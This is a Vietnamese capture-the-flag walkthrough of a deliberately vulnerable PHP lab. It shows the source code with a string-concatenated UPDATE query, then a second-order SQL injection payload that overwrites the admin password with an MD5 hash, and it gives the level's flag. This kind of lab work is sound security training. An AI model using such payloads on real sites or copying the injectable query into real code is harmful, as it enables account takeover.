# **Level 8:**

`level8.php`

```php
<?php
session_start();
if (isset($_POST["username"]) && isset($_POST["password"])) {
    try {
        include("header.php");
        $database = make_connection("advanced_db");

        $sql = "SELECT username FROM users WHERE username=? and password=?";
        $statement = $database->prepare($sql);
        $statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
        $statement->execute();
        $statement->store_result();
        $statement->bind_result($result);

        if ($statement->num_rows > 0) {
            $statement->fetch();
            $_SESSION["username"] = $result;
            die(header("Location: update.php"));
        } else {
            $message = "Wrong username or password";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

include("../basic/static/html/second-order.html");
```
`update.php`
```php
<?php
session_start();
include("header.php");
$database = make_connection("advanced_db");

if (!isset($_SESSION['username']))
    die(header("location: level8.php"));

$username = $_SESSION['username'];
$email = $_POST['email'];
if ($username === 'admin')
    $message = "<h3><b>Wow you can finally log in as admin, here is your flag flag{3b8d44262532d61b6f4eb29c37a57640}</b></h3>";

if (isset($_POST['button'])) {
    try {
        $sql = "UPDATE users SET email='$email' WHERE username='$username'";
        $db_result = $database->query($sql);
        if ($db_result) {
            $message = "Successfully update your Email";
        } else {
            $message = "Failed to update your email";
        }
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
}

include("../basic/static/html/update.html");
```
Ở đây chúng ta thấy được lỗ hổng SQLi ở `update.php`
```sql
 $sql = "UPDATE users SET email='$email' WHERE username='$username'";
```
Nếu chúng ta đăng nhập được với `username`: `admin` thì sẽ ra flag

Mình thử register một tài khoản hợp lệ rồi Login vào xem nó sẽ hiện những gì
```
username: 2
password: 2
emai: 1@gmail.com
```
<img width="1491" height="812" alt="image" src="https://github.com/user-attachments/assets/cc11d0ad-c7fb-46cc-a18d-607b645ee428" />


Lấy nó login vào được `update.php`

<img width="778" height="308" alt="image" src="https://github.com/user-attachments/assets/0db6d3b6-0f4b-483f-b469-9fe7b9b1644d" />

Đây là nơi có thể SQL Injection 

```sql
$sql = "UPDATE users SET email='$email' WHERE username='$username'";
```
Mục tiêu , set password chứ không phải set Email . Chúng ta cần truy vấn như sau:
```sql
UPDATE users SET email='1@gmail.com' , password = 'abc123' WHERE username = 'admin';
```
Vậy payload cần truyền:
```sql
1@gmail.com' , password = 'abc123' WHERE username = 'admin' -- -
```
Nhưng password nhập vào lại được Hash md5
```sql
$statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
```
Vậy nên chúng ta phải Hash md5 `abc123` thành `e99a18c428cb38d5f260853678922e03` . Bởi vì cái `UPDATE ... SET` đó nó sẽ ném nguyên cục hash rồi vào trong database . Và khi ta nhập lại từ ngoài thì cái `abc123` nó sẽ được hash rồi mới so sánh với cái trong database

Payload cuối cùng 
```sql
1@gmail.com' , password = 'e99a18c428cb38d5f260853678922e03' WHERE username = 'admin' -- -
```
<img width="1491" height="814" alt="image" src="https://github.com/user-attachments/assets/541760e8-69ba-4448-9149-a06b8b6f99d0" />

Update thành công mật khẩu admin . Giờ lấy
```
username: admin
password: abc123
```
Login vào thôi 

<img width="1012" height="369" alt="image" src="https://github.com/user-attachments/assets/00deb870-6521-4e66-b9dc-b91b8bbd4b64" />

